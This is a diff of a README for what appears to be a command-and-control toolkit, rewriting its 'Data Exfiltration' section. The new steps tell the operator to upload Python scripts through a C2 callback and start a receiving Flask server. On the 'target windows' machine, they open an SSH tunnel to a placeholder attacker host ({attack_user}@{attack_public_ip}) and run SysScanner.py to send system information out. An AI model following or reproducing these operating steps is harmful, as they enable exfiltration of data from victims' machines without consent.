@@ -73,16 +73,34 @@
 - Data Exfiltration (C2 server terminal)
 
     - extract system info to C2 server
-    ```
-    # load console 
-    # enter the following command
-    upload
-    # send two python scripts to any folder
-    # run python code with
-    load_script
-    # choose one file every time
     
-    ```
+        - On C2 Server:
+    
+            1. open the corresponding callback 
+            2. enter the following command
+                ```
+                upload
+                ```
+            3. send two python scripts to any folder
+            4. run a local server to receive package -- Flask server listen on port 8000
+                ```
+                python3 server.py
+                ```
+        
+        - On target windows:
+            0. download necessary libraries
+            ```
+            pip3 install -r requirements.txt
+            ```
+            1. open command console on target machine
+            ```
+            # for tunnel creation
+            ssh -N -f -L 8000:localhost:8000 {attack_user}@{attack_public_ip}
+            ```
+            2. choose one file every time
+            ```
+            python3 SysScanner.py
+            ```
 
 - Troubleshooting:
 
